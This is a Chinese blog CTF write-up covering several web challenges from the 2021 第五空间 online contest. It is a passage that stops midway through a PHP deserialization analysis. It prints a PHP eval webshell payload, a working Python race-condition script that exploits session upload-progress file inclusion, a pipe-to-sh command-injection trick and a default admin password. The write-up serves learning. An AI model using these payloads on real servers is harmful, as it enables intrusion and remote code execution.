@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>WP篇之2021第五空间线上赛(部分Web) | Welcome to Arsene.Tang &#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="web安全">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Welcome to Arsene.Tang 's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Welcome to Arsene.Tang &#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">一个喜欢web安全但菜的离谱的萌新</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-WP篇之2021第五空间线上赛(部分Web)" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      WP篇之2021第五空间线上赛(部分Web)
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-09-16T16:00:00.000Z" itemprop="datePublished">2021年09月17日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2021/09/17/WP%E7%AF%87%E4%B9%8B2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%B5%9B(%E9%83%A8%E5%88%86Web)/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="2021第五空间线上赛-部分Web"><a href="#2021第五空间线上赛-部分Web" class="headerlink" title="2021第五空间线上赛(部分Web)"></a>2021第五空间线上赛(部分Web)</h1><p>昨天打了第五空间的比赛，虽然说环境是真的垃圾，居然还用的是静态靶机，一堆人在里面乱搞导致题目老是出问题；不过我觉得这次web题的质量还是不错的，难度比较合适，也能从中学到一些东西</p>
+<span id="more"></span>
+
+<h2 id="1-EasyCleanup"><a href="#1-EasyCleanup" class="headerlink" title="1.EasyCleanup"></a>1.EasyCleanup</h2><p><img src="https://i.loli.net/2021/09/17/CVqLIwd9EMbpBui.png" alt="image.png"></p>
+<p>这道题进去直接就是源码，如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mode&#x27;</span>] == <span class="string">&quot;eval&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>] ?? <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$shell</span>) &gt; <span class="number">15</span> | filter(<span class="variable">$shell</span>) | checkNums(<span class="variable">$shell</span>)) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &gt; <span class="number">15</span> | filter(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) <span class="keyword">exit</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$banned</span> = [<span class="string">&quot;while&quot;</span>, <span class="string">&quot;for&quot;</span>, <span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;include&quot;</span>, <span class="string">&quot;env&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;?&quot;</span>, <span class="string">&quot;:&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>, <span class="string">&quot;`&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$banned</span> <span class="keyword">as</span> <span class="variable">$ban</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr(<span class="variable">$var</span>, <span class="variable">$ban</span>)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkNums</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$alphanum</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">    <span class="variable">$cnt</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$alphanum</span>); <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>; <span class="variable">$j</span> &lt; strlen(<span class="variable">$var</span>); <span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$var</span>[<span class="variable">$j</span>] == <span class="variable">$alphanum</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">                <span class="variable">$cnt</span> += <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$cnt</span> &gt; <span class="number">8</span>) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里看到存在文件包含而且参数可控，这种情况下基本上都可以用<code>session.upload_progress</code>直接一把梭哈；但这里前面都给了<code>eval</code>并且提示了<code>phpinfo()</code>，那我们就先看看<code>phpinfo()</code>中的内容嘛，看是不是满足条件竞争的要求：</p>
+<p><img src="https://i.loli.net/2021/09/17/RZIyJPkWgCBvjb7.png" alt="image.png"></p>
+<p>发现没有问题，是符合的，而且这里很离谱的是，<code>session.upload_progress.cleanup</code>居然是<code>Off</code>，也就是说上传上去之后它甚至都不会自动清理，那我认为甚至都不用使用条件竞争了，直接发一次包应该就可以了，那我们就写一个表单然后用burp抓包来看看，具体的操作可以看我之前写过的博客</p>
+<p><img src="https://i.loli.net/2021/09/17/N7YiXdstBQyfwlg.png" alt="image.png"></p>
+<p>就这样上传上去，然后访问，看能不能成功</p>
+<p><img src="https://i.loli.net/2021/09/17/wDAavJgykniBWs3.png" alt="image.png"></p>
+<p>成功包含，那接下来就直接写马了啊，把内容改为<code>&lt;?php eval($_REQUEST[1]);?&gt;</code></p>
+<p><img src="https://i.loli.net/2021/09/17/7OkgUVHvd8MGQBZ.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/09/17/LRytcFnQGCxA3dI.png" alt="image.png"></p>
+<p>成功拿下，接下来我还是把条件竞争的脚本放出来，感觉那种才是常规方法哈哈哈哈：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line">host = <span class="string">&#x27;http://114.115.134.72:32770/index.php&#x27;</span></span><br><span class="line">sessid = <span class="string">&#x27;la&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        session.post(</span><br><span class="line">            host,</span><br><span class="line">            data=&#123;<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>:<span class="string">&quot;&lt;?php eval($_REQUEST[1]);echo md5(&#x27;1&#x27;);?&gt;&quot;</span>&#125;,</span><br><span class="line">            files=&#123;<span class="string">&quot;file&quot;</span>:(<span class="string">&#x27;a.txt&#x27;</span>, f)&#125;,</span><br><span class="line">            cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessid&#125;,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        response = session.get(<span class="string">f&#x27;<span class="subst">&#123;host&#125;</span>?file=/tmp/sess_<span class="subst">&#123;sessid&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(response.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;c4ca4238a0b923820dcc509a6f75849b&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;[+++]retry&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">    t1 = threading.Thread(target=POST, args=(session, ))</span><br><span class="line">    t1.daemon = <span class="literal">True</span></span><br><span class="line">    t1.start()</span><br><span class="line">    READ(session)</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-WebFTP"><a href="#2-WebFTP" class="headerlink" title="2.WebFTP"></a>2.WebFTP</h2><p><img src="https://i.loli.net/2021/09/17/cDfojAaBGJXr8u7.png" alt="image.png"></p>
+<p>进去之后发现是WebFTP2021的cms，那就先去找源码，成功找到源码：<a target="_blank" rel="noopener" href="https://github.com/wifeat/WebFTP">https://github.com/wifeat/WebFTP</a></p>
+<p>然后可以看到它的初始管理员账号是<code>admin</code>，密码为<code>admin888</code>，但这道题明显是被改过了，显示密码错误，那我们就先把源码down下来，然后放到<code>Seay</code>源代码审计系统里面去看它，首先看看有没有<code>eval</code>，发现在这个<code>mytz.php</code>中发现了<code>eval</code></p>
+<p><img src="https://i.loli.net/2021/09/17/73NZgaokfPXOhYJ.png" alt="image.png"></p>
+<p>再往下看，后面出现了<code>phpinfo</code>，那就先看看<code>phpinfo</code>，说不定flag就在里面，因为这<code>eval</code>也很难利用</p>
+<p><img src="https://i.loli.net/2021/09/17/hJpTblkrKS3Qt8E.png" alt="image.png"></p>
+<p>发现的确如此，直接给它拿下了，这道题给我的启发就是以后也可以直接搜<code>phpinfo</code>试试</p>
+<p><img src="https://i.loli.net/2021/09/17/KEj1YJQGbDkBaq6.png" alt="image.png"></p>
+<h2 id="3-PNG图片转换器"><a href="#3-PNG图片转换器" class="headerlink" title="3.PNG图片转换器"></a>3.PNG图片转换器</h2><p>这个题进去之后有两个选项，一个是上传图片，另一个是转换图片，先上传一个png上去试试，传上去了之后返回了文件名，然后放到转换图片的页面去转换，它就会将图片内容base64编码，好像暂时没什么思路，但这道题是给了源码的，先把源码下下来看看：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; <span class="params">|f|</span></span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
+
+<p>好家伙，是用<code>rb</code>语言写的，这是真的头疼因为根本没学过这语言，只能尽力审一审，发现在<code>convert</code>中有问题：</p>
+<p><img src="https://i.loli.net/2021/09/17/c2ni937PhxI1Tsw.png" alt="image.png"></p>
+<p>我们可以试试先将命令写入图片中，然后在上传页面把图片传上去，最后在转换图片的页面<code>convert</code>用<code>sh</code>来执行这个图片文件，执行命令的结果就会再写入图片中，然后它会返回图片内容，不就相当于返回了命令执行的结果了吗？当然这只是一个思路哈，也不一定成功，但在这种既有上传图片页面也有解析图片页面的时候就可以试试，接下来开始操作：</p>
+<p>首先新建一个<code>1.txt</code>文件，里面内容为<code>ls /</code>，然后改名字为<code>1.png</code>，上传上去，先用burp抓个包：</p>
+<p><img src="https://i.loli.net/2021/09/17/FSwcEYiImRMBNhj.png" alt="image.png"></p>
+<p>得到文件名为<code>bb4620fa4c0a596d1d7ac66632a48a29.png</code>，然后在<code>convert</code>页面下解析这张图片，还是先抓个包：</p>
+<p><img src="https://i.loli.net/2021/09/17/pJKPeC3yv6cjZ7h.png" alt="image.png"></p>
+<p>可以看到我们的命令已经写进去了，接下来就是执行它，直接用<code>sh</code>就行，前面加一个<code>|</code></p>
+<p><img src="https://i.loli.net/2021/09/17/y3KPe96HsFDn4G2.png" alt="image.png"></p>
+<p><code>base64</code>解码出来是flag的名字是<code>FLA9_VixNxtSRFfd8IoFlnNvv</code>，那直接读它就拿下了</p>
+<p><img src="https://i.loli.net/2021/09/17/nR4KxrjdPkh8vp3.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/09/17/jGh47aPLye8D6mU.png" alt="image.png"></p>
+<p><img src="https://i.loli.net/2021/09/17/tm3HIelgSo9Rxqa.png" alt="image.png"></p>
+<p>成功拿下，flag解码出来是<code>flag&#123;Tvauy36vE0Mwt9WYOZVOR3dlNT9JTiX4&#125;</code>，这道题更多的是学到了一种新思路，也就是说即使把命令写在文件中它也是可以被执行的，在<code>kali</code>中我也试过，确实是没问题</p>
+<h2 id="4-pklovecloud"><a href="#4-pklovecloud" class="headerlink" title="4.pklovecloud"></a>4.pklovecloud</h2><p>这道题进去后源码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pkshow</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Pk very safe^.^&quot;</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">acp</span> </span></span><br><span class="line"><span class="class"></span>&#123;   </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$cinder</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$neutron</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nova</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;      </span><br><span class="line">        <span class="keyword">$this</span>-&gt;cinder = <span class="keyword">new</span> pkshow;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;cinder))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;cinder-&gt;echo_name();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ace</span></span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;     </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$openstack</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$docker</span>; </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">echo_name</span>(<span class="params"></span>)      </span></span><br><span class="line"><span class="function">    </span>&#123;   </span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack = unserialize(<span class="keyword">$this</span>-&gt;docker);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;openstack-&gt;neutron = <span class="variable">$heat</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;openstack-&gt;neutron === <span class="keyword">$this</span>-&gt;openstack-&gt;nova)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="string">&quot;./<span class="subst">&#123;$this-&gt;filename&#125;</span>&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span> (file_get_contents(<span class="variable">$file</span>))         </span><br><span class="line">            &#123;              </span><br><span class="line">                <span class="keyword">return</span> file_get_contents(<span class="variable">$file</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123; </span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;keystone lost~&quot;</span>; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]))  </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$logData</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;pks&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$logData</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__file__</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>分析源码，很明显是一个反序列化，反序列化的题一般都是从终点开始往上倒推，这道题的终点是<code>return file_get_contents($file)</code>，然后<code>$file</code>这个文件存在就行，很明显应该给它赋值为<code>flag.php</code>，然后要满足<code>$this-&gt;openstack-&gt;neutron === $this-&gt;openstack-&gt;nova</code>就行，那么就需要让<code>neutron</code>的值和<code>nova</code>的值相等就行，然后再往上看它会将<code>$this-&gt;docker</code>反序列化，那么就应该先把<code>acp</code>类的对象序列化之后赋值给<code>this -&gt; docker</code>，而让这个对象中的<code>neutron</code>属性和<code>nova</code>属性值相等，那我们就先构造这个：</p>
